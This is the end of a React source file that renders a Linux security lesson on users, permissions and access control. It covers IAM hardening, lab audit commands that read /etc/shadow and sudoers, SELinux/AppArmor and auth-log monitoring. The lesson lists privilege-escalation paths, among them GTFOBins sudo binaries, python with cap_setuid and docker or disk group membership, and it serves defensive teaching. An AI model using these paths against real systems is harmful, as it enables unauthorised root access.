capabilities</td><td style=\"color:var(--g)\">~40 granular capabilities — drop all, add only needed</td><td style=\"color:var(--y)\">Windows Privileges (SeDebugPrivilege, SeTcbPrivilege) — less granular</td></tr>\n        <tr><td>Lockout policy</td><td style=\"color:var(--t2)\">PAM faillock / faildelay — per-service configurable</td><td style=\"color:var(--t2)\">Account Lockout Policy via GPO — domain-wide</td></tr>\n      </tbody>\n    </table>\n  </div>\n</div>\n\n<!-- ═══ PANEL 09 — SECURITY DEEP DIVE ═══ -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">🔒</span><span class=\"pt\">Security Hardening — IAM Checklist &amp; Defence-in-Depth</span><span class=\"pn\">PANEL 09</span></div>\n  <div class=\"pb\">\n    <div class=\"g2\" style=\"margin-bottom:14px\">\n      <div class=\"cb cbr\">\n        <div class=\"cbt\">Attack Surface — IAM Weaknesses</div>\n        <ul style=\"list-style:none;font-size:12px;color:var(--t2)\">\n          <li style=\"padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px\"><span style=\"color:var(--r);flex-shrink:0\">›</span>Second UID-0 account in /etc/passwd (backdoor)</li>\n          <li style=\"padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px\"><span style=\"color:var(--r);flex-shrink:0\">›</span>NOPASSWD sudo rules — no authentication required</li>\n          <li style=\"padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px\"><span style=\"color:var(--r);flex-shrink:0\">›</span>Users in docker/disk/shadow groups — implicit root</li>\n          <li style=\"padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px\"><span style=\"color:var(--r);flex-shrink:0\">›</span>Weak PAM config — MD5 passwords, no lockout policy</li>\n          <li style=\"padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px\"><span style=\"color:var(--r);flex-shrink:0\">›</span>Capabilities on interpreter binaries (python, perl, ruby)</li>\n          <li style=\"padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px\"><span style=\"color:var(--r);flex-shrink:0\">›</span>sudo allowed for GTFOBins-listed binaries (vim, find, awk)</li>\n          <li style=\"padding:4px 0;display:flex;gap:8px\"><span style=\"color:var(--r);flex-shrink:0\">›</span>No MFA on SSH / sudo for privileged accounts</li>\n        </ul>\n      </div>\n      <div class=\"cb cbg\">\n        <div class=\"cbt\">Defence-in-Depth Controls</div>\n        <ul style=\"list-style:none;font-size:12px;color:var(--t2)\">\n          <li style=\"padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px\"><span style=\"color:var(--g);flex-shrink:0\">›</span>Disable root SSH login: <code>PermitRootLogin no</code> in sshd_config</li>\n          <li style=\"padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px\"><span style=\"color:var(--g);flex-shrink:0\">›</span>Enforce SSH key-only auth: <code>PasswordAuthentication no</code></li>\n          <li style=\"padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px\"><span style=\"color:var(--g);flex-shrink:0\">›</span>Audit sudoers weekly — remove NOPASSWD, restrict to specific commands</li>\n          <li style=\"padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px\"><span style=\"color:var(--g);flex-shrink:0\">›</span>Enable PAM faillock + complexity via pam_pwquality</li>\n          <li style=\"padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px\"><span style=\"color:var(--g);flex-shrink:0\">›</span>Deploy auditd rules watching /etc/passwd, /etc/sudoers, /etc/shadow</li>\n          <li style=\"padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px\"><span style=\"color:var(--g);flex-shrink:0\">›</span>Use SELinux or AppArmor to confine even root-running services</li>\n          <li style=\"padding:4px 0;display:flex;gap:8px\"><span style=\"color:var(--g);flex-shrink:0\">›</span>Deploy MFA via PAM (Google Authenticator / YubiKey) for sudo + SSH</li>\n        </ul>\n      </div>\n    </div>\n\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">Complete IAM hardening audit script</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── 1. UID-0 ACCOUNTS ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">awk -F: '($3==0){print \"[!] UID-0 account: \"$1}' /etc/passwd</span></span>\n        <span class=\"ogn\">[!] UID-0 account: root</span>\n        <span class=\"sec\">──── 2. ACCOUNTS WITH NO PASSWORD ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">awk -F: '($2==\"\" || $2==\"!!\" ){print \"[!] No password: \"$1}' /etc/shadow</span></span>\n        <span class=\"sec\">──── 3. WEAK HASH ALGORITHMS ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">awk -F: '($2 ~ /^\\$1\\$/) {print \"[!] MD5 password (WEAK): \"$1}' /etc/shadow</span></span>\n        <span class=\"sec\">──── 4. SUDOERS AUDIT ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">grep -r \"NOPASSWD\" /etc/sudoers /etc/sudoers.d/ 2>/dev/null</span></span>\n        <span class=\"ored\">jenkins  ALL=(ALL) NOPASSWD: ALL   ← critical finding</span>\n        <span class=\"sec\">──── 5. HIGH-RISK GROUP MEMBERS ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">for g in sudo docker disk shadow lxd; do members=$(getent group $g | cut -d: -f4); [ -n \"$members\" ] && echo \"[*] $g: $members\"; done</span></span>\n        <span class=\"oyn\">[*] sudo: alice,bob</span>\n        <span class=\"ored\">[*] docker: alice,jenkins</span>\n        <span class=\"ored\">[*] disk: bob</span>\n        <span class=\"sec\">──── 6. DANGEROUS CAPABILITIES ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">getcap -r / 2>/dev/null | grep -E \"setuid|dac_override|sys_admin|sys_module\"</span></span>\n        <span class=\"ored\">/usr/bin/python3.12 cap_setuid=ep   ← HIGH RISK: python can setuid to root</span>\n        <span class=\"sec\">──── 7. LOCK UNUSED ACCOUNTS ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">usermod -L olduser    # lock: prepends ! to shadow hash</span></span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">usermod -s /usr/sbin/nologin serviceaccount  # remove login shell</span></span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- ═══ PANEL 10 — SELINUX / APPARMOR ═══ -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">🛡</span><span class=\"pt\">SELinux &amp; AppArmor — Mandatory Access Control (MAC)</span><span class=\"pn\">PANEL 10</span></div>\n  <div class=\"pb\">\n    <div class=\"g2\" style=\"margin-bottom:14px\">\n      <div class=\"cb cbr\">\n        <div class=\"cbt\">SELinux — Label-Based MAC (RHEL/CentOS/Fedora)</div>\n        <div class=\"ct\">\n          Every process and file gets a <span class=\"hr\">security label</span> (<code>user:role:type:level</code>). The SELinux policy defines which types can access which other types — regardless of DAC permissions.<br><br>\n          Even if root tries to read a file with the wrong type, SELinux can <span class=\"hl\">deny it</span>. This confines kernel exploits — compromised nginx cannot read /etc/shadow if policy denies httpd_t → shadow_t.<br><br>\n          Modes: <span class=\"hl\">Enforcing</span> (blocks + logs), <span class=\"hy\">Permissive</span> (logs only), <span class=\"hr\">Disabled</span> (off — bad).\n        </div>\n      </div>\n      <div class=\"cb cbp\">\n        <div class=\"cbt\">AppArmor — Path-Based MAC (Ubuntu/Debian)</div>\n        <div class=\"ct\">\n          AppArmor profiles restrict programs by <span class=\"hp\">filesystem path</span>. Simpler than SELinux. Profile defines: which files the process can read/write/execute, which capabilities it can use, which network operations are allowed.<br><br>\n          Profiles in <code>/etc/apparmor.d/</code>. Modes: <span class=\"hl\">enforce</span> (block violations) and <span class=\"hy\">complain</span> (log only — for writing new profiles).<br><br>\n          Default profiles on Ubuntu: nginx, mysqld, sshd, cups, snapd — all confined.\n        </div>\n      </div>\n    </div>\n\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">SELinux + AppArmor commands</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── SELINUX STATUS & LABELS ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">getenforce && sestatus</span></span>\n        <span class=\"ogn\">Enforcing</span>\n        <span class=\"out\">SELinux status:     enabled</span>\n        <span class=\"ogn\">SELinuxfs mount:    /sys/fs/selinux</span>\n        <span class=\"out\">Current mode:       enforcing</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">ls -Z /etc/shadow</span></span>\n        <span class=\"ocn\">system_u:object_r:shadow_t:s0 /etc/shadow</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">ps -eZ | grep nginx</span></span>\n        <span class=\"ocn\">system_u:system_r:httpd_t:s0  nginx: worker</span>\n        <span class=\"sec\">──── SELINUX DENIAL AUDIT ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">ausearch -m AVC -ts recent | tail -8</span></span>\n        <span class=\"ored\">type=AVC msg=audit: avc: denied { read } for pid=1500 comm=\"nginx\"</span>\n        <span class=\"ored\">  path=\"/etc/shadow\" dev=\"nvme0n1p2\" ino=924674</span>\n        <span class=\"ored\">  scontext=system_u:system_r:httpd_t:s0</span>\n        <span class=\"ored\">  tcontext=system_u:object_r:shadow_t:s0</span>\n        <span class=\"ogn\"># nginx (httpd_t) denied reading shadow_t — SELinux worked!</span>\n        <span class=\"sec\">──── APPARMOR STATUS ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">aa-status</span></span>\n        <span class=\"out\">apparmor module is loaded.</span>\n        <span class=\"out\">25 profiles are loaded.</span>\n        <span class=\"ogn\">22 profiles are in enforce mode:</span>\n        <span class=\"out\">   /usr/sbin/nginx</span>\n        <span class=\"out\">   /usr/sbin/sshd</span>\n        <span class=\"oyn\">3 profiles are in complain mode:</span>\n        <span class=\"out\">   /usr/sbin/mysqld</span>\n        <span class=\"sec\">──── APPARMOR PROFILE SNIPPET ────</span>\n        <span class=\"out\"># /etc/apparmor.d/usr.sbin.nginx</span>\n        <span class=\"ocn\">/usr/sbin/nginx {</span>\n        <span class=\"out\">  capability net_bind_service,</span>\n        <span class=\"out\">  /var/www/html/ r,</span>\n        <span class=\"out\">  /var/www/html/** r,</span>\n        <span class=\"out\">  /var/log/nginx/ rw,</span>\n        <span class=\"ored\">  deny /etc/shadow r,    # explicit deny even if DAC allows</span>\n        <span class=\"ocn\">}</span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- ═══ PANEL 11 — MONITORING ═══ -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">📊</span><span class=\"pt\">Monitoring — Authentication Events &amp; Suspicious Activity</span><span class=\"pn\">PANEL 11</span></div>\n  <div class=\"pb\">\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">Auth monitoring & forensics</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── LOGIN HISTORY ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">last -20</span></span>\n        <span class=\"out\">alice  pts/0  192.168.1.50  Mon May  3 10:12   still logged in</span>\n        <span class=\"out\">root   pts/1  10.10.10.5    Sun May  2 02:44 - 02:47  (00:03)</span>\n        <span class=\"ored\"># root login from external IP at 2AM — investigate immediately</span>\n        <span class=\"sec\">──── FAILED LOGINS ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">lastb | head -10</span></span>\n        <span class=\"ored\">root   ssh:notty  10.10.10.5  Sun May 2 02:40   ← brute force</span>\n        <span class=\"ored\">root   ssh:notty  10.10.10.5  Sun May 2 02:40</span>\n        <span class=\"ored\">root   ssh:notty  10.10.10.5  Sun May 2 02:41</span>\n        <span class=\"sec\">──── REAL-TIME AUTH MONITORING ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">tail -f /var/log/auth.log | grep -E \"Failed|Invalid|sudo|ROOT\"</span></span>\n        <span class=\"ored\">May 03 02:40:11 lab sshd[3241]: Failed password for root from 10.10.10.5</span>\n        <span class=\"ored\">May 03 10:14:22 lab sudo: alice : COMMAND=/bin/bash (abnormal sudo to bash!)</span>\n        <span class=\"sec\">──── WHO IS LOGGED IN NOW ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">w</span></span>\n        <span class=\"out\"> 10:15  up 5 days,  load: 0.12, 0.08, 0.04</span>\n        <span class=\"out\">USER     TTY   FROM           LOGIN@  IDLE  WHAT</span>\n        <span class=\"ogn\">alice    pts/0 192.168.1.50  10:12   0s    -bash</span>\n        <span class=\"ored\">unknown  pts/1 10.10.10.5   02:44   0s    /bin/bash   ← active session from attack IP!</span>\n        <span class=\"sec\">──── KILL SUSPICIOUS SESSION ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">pkill -9 -t pts/1   # kill processes on that terminal</span></span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">who -a | awk '{print $2}' | xargs -I{} fuser -k {}</span></span>\n        <span class=\"sec\">──── AUDIT RULE: WATCH SENSITIVE FILES ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">auditctl -w /etc/passwd   -p wa -k passwd_changes</span></span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">auditctl -w /etc/shadow   -p wa -k shadow_changes</span></span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">auditctl -w /etc/sudoers  -p wa -k sudoers_changes</span></span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">ausearch -k passwd_changes -ts today</span></span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- ═══ PANEL 12 — CHECKLIST ═══ -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">✔</span><span class=\"pt\">Auditor / Security Checklist — Step 4 Verification</span><span class=\"pn\">PANEL 12</span></div>\n  <div class=\"pb\">\n    <ul class=\"cl\">\n      <li><div class=\"chk\">✓</div>Can you find all UID-0 accounts and identify which ones are legitimate?<span class=\"tag tr2\" style=\"margin-left:auto\">UID-0</span></li>\n      <li><div class=\"chk\">✓</div>Can you decode a /etc/shadow entry and identify if MD5 ($1$) is being used?<span class=\"tag ty\" style=\"margin-left:auto\">SHADOW</span></li>\n      <li><div class=\"chk\">✓</div>Can you identify which groups grant effective root access (docker, disk, shadow, lxd)?<span class=\"tag tr2\" style=\"margin-left:auto\">GROUPS</span></li>\n      <li><div class=\"chk\">✓</div>Can you read and explain every field in /etc/sudoers and identify dangerous rules?<span class=\"tag to\" style=\"margin-left:auto\">SUDO</span></li>\n      <li><div class=\"chk\">✓</div>Can you explain PAM module types (auth/account/password/session) and control flags?<span class=\"tag tc\" style=\"margin-left:auto\">PAM</span></li>\n      <li><div class=\"chk\">✓</div>Can you configure pam_pwquality and pam_faillock for password policy and lockout?<span class=\"tag tg\" style=\"margin-left:auto\">HARDEN</span></li>\n      <li><div class=\"chk\">✓</div>Can you audit all binaries with dangerous capabilities using getcap -r /?<span class=\"tag tp\" style=\"margin-left:auto\">CAPS</span></li>\n      <li><div class=\"chk\">✓</div>Can you demonstrate at least 3 privilege escalation paths and their detection method?<span class=\"tag tr2\" style=\"margin-left:auto\">PRIVESC</span></li>\n      <li><div class=\"chk\">✓</div>Can you set and read ACLs with setfacl/getfacl and configure default ACLs?<span class=\"tag tc\" style=\"margin-left:auto\">ACL</span></li>\n      <li><div class=\"chk\">✓</div>Can you check SELinux/AppArmor status and read AVC denial logs?<span class=\"tag tp\" style=\"margin-left:auto\">MAC</span></li>\n      <li><div class=\"chk\">✓</div>Can you use last, lastb, and auth.log to reconstruct a login timeline?<span class=\"tag tg\" style=\"margin-left:auto\">FORENSICS</span></li>\n      <li><div class=\"chk\">✓</div>Can you set auditd watch rules on /etc/passwd, /etc/shadow, /etc/sudoers?<span class=\"tag ty\" style=\"margin-left:auto\">AUDIT</span></li>\n    </ul>\n  </div>\n</div>\n\n<!-- ═══ PANEL 13 — SUMMARY ═══ -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">◉</span><span class=\"pt\">Summary — Step 4 Complete</span><span class=\"pn\">PANEL 13</span></div>\n  <div class=\"pb\">\n    <div class=\"g3\" style=\"margin-bottom:0\">\n      <div class=\"sum-card\">\n        <div class=\"sc-l\">Identity & Users</div>\n        <div class=\"sc-v\">Linux uses numeric UIDs — UID 0 = root, no exceptions. /etc/passwd maps names to UIDs. /etc/shadow stores hashed passwords (SHA-512). Service accounts use nologin shell. Always audit for UID-0 duplicates and empty passwords.</div>\n      </div>\n      <div class=\"sum-card\">\n        <div class=\"sc-l\">sudo + PAM + Capabilities</div>\n        <div class=\"sc-v\">sudo delegates specific commands with full audit trail. PAM is a modular auth stack — controls login, lockout, MFA, limits. Capabilities split root power into 40 tokens — prefer capabilities over SUID. Audit: getcap, sudo -l, faillock.</div>\n      </div>\n      <div class=\"sum-card\">\n        <div class=\"sc-l\">MAC + PrivEsc + Monitoring</div>\n        <div class=\"sc-v\">SELinux/AppArmor add mandatory layer above DAC — even root is restricted. PrivEsc paths: SUID, sudo misconfig, writable cron, PATH hijack, kernel CVEs. Detect via auditd, auth.log, last, w, AVC denials.</div>\n      </div>\n    </div>\n    <div class=\"nxt\">\n      <div>\n        <div style=\"font-family:var(--sans);font-weight:600;font-size:14px;color:var(--g)\">▶ Next: Step 5 — Process &amp; Service Management</div>\n        <div style=\"font-size:11px;color:var(--t3);margin-top:2px\">Process lifecycle · daemons · signals · systemd deep dive · cron · resource limits · Linux vs Windows process management</div>\n      </div>\n      <button class=\"nb\" onclick=\"window.sendPrompt && window.sendPrompt('Start Step 5')\">$ Start Step 5 →</button>\n    </div>\n  </div>\n</div>\n\n</div>";

export default function LinuxStep4() {
  return <LessonDocument title="Users Permissions Access Control" styles={styles} markup={markup} />;
}
